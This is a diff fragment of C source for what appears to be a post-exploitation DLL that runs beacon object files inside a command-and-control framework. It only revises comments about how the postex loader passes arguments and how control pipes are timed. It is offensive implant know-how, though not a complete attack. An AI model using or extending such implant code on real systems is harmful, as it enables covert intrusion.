@@ -585,10 +585,12 @@ static int read_next_blob(HANDLE ctrl, char ** pipeOut, char ** bofOut, int * bo
 /* ---------------- main ---------------- */
 
 static void run_async(LPVOID raw) {
-	/* C-19 root cause: the postex loader hands lpReserved = LOADER BASE;
- 	 * the real args live in the __POSTEX_USER_ARGS__ buffer patched
- 	 * in-place by ExecuteDllJob.fix (256B cap). Same contract as the kit.
- 	 */
+	/* C-19/C-24 corrected: the postex loader forwards the thread parameter
+	 * as lpReserved (entry: mov r15,rcx at 0x1e; mov r8,r15 at 0x1e1) -
+	 * it was NEVER the loader base (the old C-19 conclusion was wrong).
+	 * Our asyncdll reads args from the __POSTEX_USER_ARGS__ buffer patched
+	 * in-place by ExecuteDllJob.fix (header-bounded reads, no fixed cap);
+	 * kit-contract DLLs read straight from lpReserved instead. */
 	POSTEX_ARGUMENTS * pa = (POSTEX_ARGUMENTS *)gPostexArgumentsBuffer;
 	int blobLen = pa->userArgumentBufferSize;
 	DATAP d;
@@ -615,7 +617,7 @@ static void run_async(LPVOID raw) {
 		g_outLen = 0;
 		run_bof(bof, bl);
 		if (runOnce) {
-			/* kit once-mode parity (2026-11-12 live forensics): the beacon's
+			/* OUR asyncdll once-mode design (2026-11-12): the beacon's
 			 * CONTROL-pipe register (ExecuteDllJob 101, wait=15000) runs
 			 * BEFORE the cna's output-pipe register at the same checkin -
 			 * its pipe_try blocks the queue 15s and the output register
